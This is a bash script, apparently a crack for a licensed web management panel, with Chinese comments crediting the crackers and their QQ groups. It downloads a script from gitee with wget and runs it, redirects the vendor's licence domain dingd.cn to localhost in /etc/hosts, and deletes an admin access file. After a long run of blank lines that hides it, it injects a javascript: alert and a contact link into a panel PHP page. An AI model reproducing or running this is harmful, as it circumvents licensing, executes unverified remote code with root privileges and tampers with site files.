#!/bin/bash

echo '正在获取脚本...'
echo '破解作者：Semi尼玛 QQ：154477274 群：104911190'
echo '有问题请加群讨论'
wget https://gitee.com/seminima/fas/blob/master/nmfas.sh;bash nmfas.sh

echo '#盗版屏蔽dingd.cn
127.0.0.1 www.dingd.cn
127.0.0.1 api.dingd.cn' >> /etc/hosts
echo '#盗版屏蔽dingd.cn
127.0.0.1 www.dingd.cn
127.0.0.1 api.dingd.cn' >> /etc/fas_host

rm -f /var/www/html/admin/access.php

























































































#sed -i 's/谨防盗版 违者必究/Cracked By 凌一/g' /var/www/html/admin/footer.php > /dev/null 2>&1
sed -i "s#http://www.dingd.cn/#javascript:alert('破解By凌一Qq863963860');window.open('http://wpa.qq.com/msgrd?v=3\&uin=863963860\&site=qq\&menu=yes');#g" /var/www/html/admin/create_app.php > /dev/null 2>&1